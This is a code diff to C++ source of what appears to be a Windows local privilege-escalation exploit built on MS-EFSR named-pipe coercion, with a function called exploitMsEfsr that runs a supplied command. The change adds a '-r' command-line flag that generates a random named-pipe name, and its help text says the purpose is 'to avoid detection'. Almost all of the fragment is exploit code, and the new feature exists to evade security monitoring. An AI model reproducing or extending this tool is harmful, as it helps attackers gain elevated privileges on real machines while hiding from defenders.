@@ -243,8 +243,8 @@ BOOL exploitMsEfsr(wchar_t* command, std::wstring randomNamedpipe) {
     namedpipe = (wchar_t*)LocalAlloc(LPTR, MAX_PATH * sizeof(WCHAR));
 
     StringCchPrintf(namedpipe, MAX_PATH, L"\\\\.\\pipe\\");
-//  StringCchCat(namedpipe, MAX_PATH, randomNamedpipe.c_str());
-    StringCchCat(namedpipe, MAX_PATH, L"coerced");
+    StringCchCat(namedpipe, MAX_PATH, randomNamedpipe.c_str());
+    //StringCchCat(namedpipe, MAX_PATH, L"coerced");
     StringCchCat(namedpipe, MAX_PATH, L"\\pipe\\srvsvc");
 
     if (!createNamedPipe(namedpipe, command)) {
@@ -282,6 +282,9 @@ int main(int argc, char** argv)
     bool interactive = true;
     app.add_option("--interactive", interactive, "Set wether the process should be run within the same shell or open a new window. (Default value : true)");
 
+    bool random = false;
+    app.add_option("-r", random, "Use random namedpipe to avoid detection (Default value : false)");
+
 
     CLI11_PARSE(app, argc, argv);
 
@@ -290,9 +293,11 @@ int main(int argc, char** argv)
     wchar_t* command = new wchar_t[maxBufferSize];
     size_t convertedChars = 0;
     mbstowcs_s(&convertedChars, command, maxBufferSize, charPointer, maxBufferSize - 1);
-
-    std::wstring randomNamedpipe = generateRandomString();
-
+    std::wstring randomNamedpipe = L"coerced";
+    if (random)
+    {
+        randomNamedpipe = generateRandomString();
+    }
     g_pwszCommandLine = command;
     g_bInteractWithConsole = interactive;
 
